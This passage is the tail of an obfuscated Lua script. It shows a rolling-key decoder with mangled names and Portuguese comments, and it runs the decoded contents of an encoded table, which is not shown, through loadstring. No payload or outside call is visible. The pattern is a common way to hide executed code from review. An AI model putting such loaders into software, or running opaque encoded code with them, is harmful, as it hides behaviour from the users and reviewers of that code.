    local function VM_I0l0(d, k, m)
        local R_IlIllll = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_IlIllll, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_IlIllll)
    end

    -- Execution Guard
    local F_01l1O00 = loadstring(VM_I0l0(B_ll1I, 86, 5))
    if F_01l1O00 then
        F_01l1O00(...)
    end
end)(...)
